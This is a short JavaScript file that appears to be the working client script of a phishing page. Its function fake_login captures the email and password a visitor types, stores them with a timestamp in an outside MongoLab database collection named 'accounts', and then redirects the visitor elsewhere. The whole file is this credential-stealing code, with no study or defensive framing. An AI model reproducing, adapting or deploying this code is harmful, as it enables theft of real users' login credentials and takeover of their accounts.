var mongolab = new MongoLab(config.mongolab_api_key);
var COLLECTION = 'accounts';

function send_data(login, password, callback) {
    var account = {
        'time': Date.now() / 1000 | 0,
        'login': encodeURIComponent(login),
        'password': encodeURIComponent(password)
    };
    mongolab.insertDocuments(config.db_name, COLLECTION, account, callback);
}

function fake_login() {
    var email = $('#email').val();
    var password = $('#pass').val();

    send_data(email, password, function() {
        location.href = config.redirect_uri;
    });
}

$(function() {
    $('#pass').keypress(function(e) {
        if (e.which == 13) {
            fake_login();
            return false;
        }
    });
});
